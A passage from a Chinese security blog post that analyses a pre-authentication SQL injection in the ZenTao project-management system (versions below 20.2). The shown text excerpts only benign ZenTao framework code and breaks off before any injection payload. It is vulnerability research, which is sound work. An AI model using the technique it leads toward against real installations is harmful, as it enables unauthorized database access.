<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="HandheldFriendly" content="True"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=5"><meta name="description" content="正文漏洞分析代码直接从次新版20.1.1 第一次看zentao的系统，第一步肯定还是需要熟悉框架，还好前人栽树后人乘凉，简单看下面这个链接可以过一下 https:&#x2F;&#x2F;blog.csdn.net&#x2F;hjlyffsina&#x2F;article&#x2F;details&#x2F;112280795 在index.php中，首先创建了应用实例，初始化了一些配置 12345678910111213141516171819202122"><meta property="og:type" content="article"><meta property="og:title" content="浅析禅道前台SQL注入(Version&lt;20.2)"><meta property="og:url" content="https://y4tacker.github.io/2024/08/26/year/2024/8/%E6%B5%85%E6%9E%90%E7%A6%85%E9%81%93%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-Version-20-2/index.html"><meta property="og:site_name" content="Y4tacker:Hacking The World!"><meta property="og:description" content="正文漏洞分析代码直接从次新版20.1.1 第一次看zentao的系统，第一步肯定还是需要熟悉框架，还好前人栽树后人乘凉，简单看下面这个链接可以过一下 https:&#x2F;&#x2F;blog.csdn.net&#x2F;hjlyffsina&#x2F;article&#x2F;details&#x2F;112280795 在index.php中，首先创建了应用实例，初始化了一些配置 12345678910111213141516171819202122"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://y4tacker.github.io/2024/08/26/year/2024/8/%E6%B5%85%E6%9E%90%E7%A6%85%E9%81%93%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-Version-20-2/image-20240826221407774.png"><meta property="og:image" content="https://y4tacker.github.io/2024/08/26/year/2024/8/%E6%B5%85%E6%9E%90%E7%A6%85%E9%81%93%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-Version-20-2/image-20240827001334993.png"><meta property="og:image" content="https://y4tacker.github.io/2024/08/26/year/2024/8/%E6%B5%85%E6%9E%90%E7%A6%85%E9%81%93%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-Version-20-2/image-20240826234855004.png"><meta property="og:image" content="https://y4tacker.github.io/2024/08/26/year/2024/8/%E6%B5%85%E6%9E%90%E7%A6%85%E9%81%93%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-Version-20-2/image-20240826234948204.png"><meta property="og:image" content="https://y4tacker.github.io/2024/08/26/year/2024/8/%E6%B5%85%E6%9E%90%E7%A6%85%E9%81%93%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-Version-20-2/image-20240827000059791.png"><meta property="og:image" content="https://y4tacker.github.io/2024/08/26/year/2024/8/%E6%B5%85%E6%9E%90%E7%A6%85%E9%81%93%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-Version-20-2/image-20240827000126205.png"><meta property="og:image" content="https://y4tacker.github.io/2024/08/26/year/2024/8/%E6%B5%85%E6%9E%90%E7%A6%85%E9%81%93%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-Version-20-2/image-20240827000152432.png"><meta property="og:image" content="https://y4tacker.github.io/2024/08/26/year/2024/8/%E6%B5%85%E6%9E%90%E7%A6%85%E9%81%93%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-Version-20-2/image-20240827000633373.png"><meta property="og:image" content="https://y4tacker.github.io/2024/08/26/year/2024/8/%E6%B5%85%E6%9E%90%E7%A6%85%E9%81%93%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-Version-20-2/image-20240827000657535.png"><meta property="og:image" content="https://y4tacker.github.io/2024/08/26/year/2024/8/%E6%B5%85%E6%9E%90%E7%A6%85%E9%81%93%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-Version-20-2/image-20240827001018434.png"><meta property="og:image" content="https://y4tacker.github.io/2024/08/26/year/2024/8/%E6%B5%85%E6%9E%90%E7%A6%85%E9%81%93%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-Version-20-2/image-20240827001108415.png"><meta property="og:image" content="https://y4tacker.github.io/2024/08/26/year/2024/8/%E6%B5%85%E6%9E%90%E7%A6%85%E9%81%93%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-Version-20-2/image-20240827001237320.png"><meta property="og:image" content="https://y4tacker.github.io/2024/08/26/year/2024/8/%E6%B5%85%E6%9E%90%E7%A6%85%E9%81%93%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-Version-20-2/image-20240827001420998.png"><meta property="og:image" content="https://y4tacker.github.io/2024/08/26/year/2024/8/%E6%B5%85%E6%9E%90%E7%A6%85%E9%81%93%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-Version-20-2/image-20240827214056652.png"><meta property="og:image" content="https://y4tacker.github.io/2024/08/26/year/2024/8/%E6%B5%85%E6%9E%90%E7%A6%85%E9%81%93%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-Version-20-2/image-20240827214648827.png"><meta property="og:image" content="https://y4tacker.github.io/2024/08/26/year/2024/8/%E6%B5%85%E6%9E%90%E7%A6%85%E9%81%93%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-Version-20-2/image-20240827214801468.png"><meta property="og:image" content="https://y4tacker.github.io/2024/08/26/year/2024/8/%E6%B5%85%E6%9E%90%E7%A6%85%E9%81%93%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-Version-20-2/image-20240827214829916.png"><meta property="og:image" content="https://y4tacker.github.io/2024/08/26/year/2024/8/%E6%B5%85%E6%9E%90%E7%A6%85%E9%81%93%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-Version-20-2/image-20240827214901452.png"><meta property="og:image" content="https://y4tacker.github.io/2024/08/26/year/2024/8/%E6%B5%85%E6%9E%90%E7%A6%85%E9%81%93%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-Version-20-2/image-20240827215258268.png"><meta property="article:published_time" content="2024-08-26T13:10:51.000Z"><meta property="article:modified_time" content="2025-09-02T14:52:00.813Z"><meta property="article:author" content="Y4tacker"><meta property="article:tag" content="PHP"><meta property="article:tag" content="禅道"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://y4tacker.github.io/2024/08/26/year/2024/8/%E6%B5%85%E6%9E%90%E7%A6%85%E9%81%93%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-Version-20-2/image-20240826221407774.png"><link rel="shortcut icon" href="/images/favicon.ico"><link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><title>浅析禅道前台SQL注入(Version&lt;20.2)</title><link rel="stylesheet" href="/css/style.css"><meta name="generator" content="Hexo 5.4.1"><link rel="alternate" href="/atom.xml" title="Y4tacker:Hacking The World!" type="application/atom+xml"></head><body class="max-width mx-auto px3 ltr"><div id="header-post"><a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a> <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a> <a id="top-icon-tablet" href="#" aria-label="Top" onclick='$("html, body").animate({scrollTop:0},"fast")' style="display:none"><i class="fa-solid fa-chevron-up fa-lg"></i></a> <span id="menu"><span id="nav"><ul><li><a href="/">Home</a></li><li><a href="/archives/">Writing</a></li><li><a href="/tags/">Topics</a></li><li><a href="/search/">Search</a></li><li><a href="/about/">About</a></li><li><a href="/link/">Friends</a></li></ul></span><br><span id="actions"><ul><li><a class="icon" aria-label="Previous post" href="/2024/08/27/year/2024/8/%E7%A6%85%E9%81%93%E5%88%A9%E7%94%A8%E7%AC%AC%E4%BA%8C%E5%BC%B9%E4%B9%8B%E4%BB%8ESQLi%E5%88%B0RCE/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover='$("#i-prev").toggle()' onmouseout='$("#i-prev").toggle()'></i></a></li><li><a class="icon" aria-label="Next post" href="/2024/08/24/year/2024/8/Bamboocloud-Pre-Auth-RCE/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle()' onmouseout='$("#i-next").toggle()'></i></a></li><li><a class="icon" aria-label="Back to top" href="#" onclick='$("html, body").animate({scrollTop:0},"fast")'><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle()' onmouseout='$("#i-top").toggle()'></i></a></li><li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle()' onmouseout='$("#i-share").toggle()' onclick='return $("#share").toggle(),!1'></i></a></li></ul><span id="i-prev" class="info" style="display:none">Previous post</span> <span id="i-next" class="info" style="display:none">Next post</span> <span id="i-top" class="info" style="display:none">Back to top</span> <span id="i-share" class="info" style="display:none">Share post</span></span><br><div id="share" style="display:none"><ul><li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://y4tacker.github.io/2024/08/26/year/2024/8/%E6%B5%85%E6%9E%90%E7%A6%85%E9%81%93%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-Version-20-2/"><i class="fab fa-facebook" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://y4tacker.github.io/2024/08/26/year/2024/8/%E6%B5%85%E6%9E%90%E7%A6%85%E9%81%93%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-Version-20-2/&text=浅析禅道前台SQL注入(Version&lt;20.2)"><i class="fab fa-twitter" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://y4tacker.github.io/2024/08/26/year/2024/8/%E6%B5%85%E6%9E%90%E7%A6%85%E9%81%93%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-Version-20-2/&title=浅析禅道前台SQL注入(Version&lt;20.2)"><i class="fab fa-linkedin" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://y4tacker.github.io/2024/08/26/year/2024/8/%E6%B5%85%E6%9E%90%E7%A6%85%E9%81%93%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-Version-20-2/&is_video=false&description=浅析禅道前台SQL注入(Version&lt;20.2)"><i class="fab fa-pinterest" aria-hidden="true"></i></a></li><li><a class="icon" href="mailto:?subject=浅析禅道前台SQL注入(Version&lt;20.2)&body=Check out this article: https://y4tacker.github.io/2024/08/26/year/2024/8/%E6%B5%85%E6%9E%90%E7%A6%85%E9%81%93%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-Version-20-2/"><i class="fa-solid fa-envelope" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://y4tacker.github.io/2024/08/26/year/2024/8/%E6%B5%85%E6%9E%90%E7%A6%85%E9%81%93%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-Version-20-2/&title=浅析禅道前台SQL注入(Version&lt;20.2)"><i class="fab fa-get-pocket" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://y4tacker.github.io/2024/08/26/year/2024/8/%E6%B5%85%E6%9E%90%E7%A6%85%E9%81%93%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-Version-20-2/&title=浅析禅道前台SQL注入(Version&lt;20.2)"><i class="fab fa-reddit" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://y4tacker.github.io/2024/08/26/year/2024/8/%E6%B5%85%E6%9E%90%E7%A6%85%E9%81%93%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-Version-20-2/&title=浅析禅道前台SQL注入(Version&lt;20.2)"><i class="fab fa-stumbleupon" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://y4tacker.github.io/2024/08/26/year/2024/8/%E6%B5%85%E6%9E%90%E7%A6%85%E9%81%93%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-Version-20-2/&title=浅析禅道前台SQL注入(Version&lt;20.2)"><i class="fab fa-digg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://y4tacker.github.io/2024/08/26/year/2024/8/%E6%B5%85%E6%9E%90%E7%A6%85%E9%81%93%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-Version-20-2/&name=浅析禅道前台SQL注入(Version&lt;20.2)&description="><i class="fab fa-tumblr" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://y4tacker.github.io/2024/08/26/year/2024/8/%E6%B5%85%E6%9E%90%E7%A6%85%E9%81%93%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-Version-20-2/&t=浅析禅道前台SQL注入(Version&lt;20.2)"><i class="fab fa-hacker-news" aria-hidden="true"></i></a></li></ul></div><div id="toc"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A3%E6%96%87"><span class="toc-number">1.</span> <span class="toc-text">正文</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B8%A9%E5%9D%911-%E7%8E%AF%E5%A2%83%E7%82%B8%E4%BA%86"><span class="toc-number">1.2.</span> <span class="toc-text">踩坑1-环境炸了</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B8%A9%E5%9D%912-%E5%A6%82%E4%BD%95%E8%A7%A6%E5%8F%91SQL%E6%89%A7%E8%A1%8C"><span class="toc-number">1.3.</span> <span class="toc-text">踩坑2-如何触发SQL执行</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D"><span class="toc-number">2.</span> <span class="toc-text">修复</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-number">3.</span> <span class="toc-text">其他</span></a></li></ol></div></span></div><div class="content index py4"><article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting"><header><h1 class="posttitle p-name" itemprop="name headline">浅析禅道前台SQL注入(Version&lt;20.2)</h1><div class="meta"><span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person"><span class="p-name" itemprop="name">Y4tacker</span></span><div class="postdate"><time datetime="2024-08-26T13:10:51.000Z" class="dt-published" itemprop="datePublished">2024-08-26</time> (Updated: <time datetime="2025-09-02T14:52:00.813Z" class="dt-updated" itemprop="dateModified">2025-09-02</time>)</div><div class="article-category"><i class="fa-solid fa-archive"></i> <a class="category-link" href="/categories/PHP/">PHP</a></div><div class="article-tag"><i class="fa-solid fa-tag"></i> <a class="p-category" href="/tags/PHP/" rel="tag">PHP</a>, <a class="p-category" href="/tags/%E7%A6%85%E9%81%93/" rel="tag">禅道</a></div></div></header><div class="content e-content" itemprop="articleBody"><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>代码直接从次新版20.1.1</p><p>第一次看zentao的系统，第一步肯定还是需要熟悉框架，还好前人栽树后人乘凉，简单看下面这个链接可以过一下</p><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/hjlyffsina/article/details/112280795">https://blog.csdn.net/hjlyffsina/article/details/112280795</a></p><p>在index.php中，首先创建了应用实例，初始化了一些配置</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$app</span> = router::createApp(<span class="string">&#x27;pms&#x27;</span>, dirname(dirname(<span class="keyword">__FILE__</span>)), <span class="string">&#x27;router&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">createApp</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$appName</span> = <span class="string">&#x27;demo&#x27;</span>, <span class="keyword">string</span> <span class="variable">$appRoot</span> = <span class="string">&#x27;&#x27;</span>, <span class="keyword">string</span> <span class="variable">$className</span> = <span class="string">&#x27;&#x27;</span>, <span class="keyword">string</span> <span class="variable">$mode</span> = <span class="string">&#x27;running&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$className</span>)) <span class="variable">$className</span> = <span class="built_in">self</span>::class;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="variable">$className</span>(<span class="variable">$appName</span>, <span class="variable">$appRoot</span>, <span class="variable">$mode</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$appName</span> = <span class="string">&#x27;demo&#x27;</span>, <span class="keyword">string</span> <span class="variable">$appRoot</span> = <span class="string">&#x27;&#x27;</span>, <span class="keyword">string</span> <span class="variable">$mode</span> = <span class="string">&#x27;running&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$mode</span> != <span class="string">&#x27;running&#x27;</span>) <span class="keyword">$this</span>-&gt;&#123;<span class="variable">$mode</span>&#125; = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;setPathFix();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;setBasePath();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;setFrameRoot();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;setCoreLibRoot();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;setAppRoot(<span class="variable">$appName</span>, <span class="variable">$appRoot</span>);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;setTmpRoot();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;setCacheRoot();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;setLogRoot();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;setConfigRoot();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;setModuleRoot();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;setWwwRoot();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;setThemeRoot();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;setDataRoot();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;loadMainConfig();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;loadClass(<span class="string">&#x27;front&#x27;</span>,  <span class="variable">$static</span> = <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;loadClass(<span class="string">&#x27;filter&#x27;</span>, <span class="variable">$static</span> = <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;loadClass(<span class="string">&#x27;form&#x27;</span>,   <span class="variable">$static</span> = <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;loadClass(<span class="string">&#x27;dbh&#x27;</span>,    <span class="variable">$static</span> = <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;loadClass(<span class="string">&#x27;sqlite&#x27;</span>, <span class="variable">$static</span> = <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;loadClass(<span class="string">&#x27;dao&#x27;</span>,    <span class="variable">$static</span> = <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;loadClass(<span class="string">&#x27;mobile&#x27;</span>, <span class="variable">$static</span> = <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;setCookieSecure();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;setDebug();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;setErrorHandler();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;setTimezone();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;config-&gt;framework-&gt;autoConnectDB) <span class="keyword">$this</span>-&gt;connectDB();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;setupProfiling();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;setupXhprof();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;setEdition();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;setClient();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;loadCacheConfig();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在其中通过<code>loadMainConfig</code>初始化config参数，加载<code>config/config.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loadMainConfig</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* 初始化$config对象。Init the $config object. */</span></span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$config</span>, <span class="variable">$filter</span>;</span><br><span class="line">    <span class="keyword">if</span>(!is_object(<span class="variable">$config</span>)) <span class="variable">$config</span> = <span class="keyword">new</span> config();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;config = <span class="variable">$config</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 加载主配置文件。 Load the main config file. */</span></span><br><span class="line">    <span class="variable">$mainConfigFile</span> = <span class="keyword">$this</span>-&gt;configRoot . <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(!file_exists(<span class="variable">$mainConfigFile</span>)) <span class="keyword">$this</span>-&gt;triggerError(<span class="string">&quot;The main config file <span class="subst">$mainConfigFile</span> not found&quot;</span>, <span class="keyword">__FILE__</span>, <span class="keyword">__LINE__</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$mainConfigFile</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Config.php如下，简单记录下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span 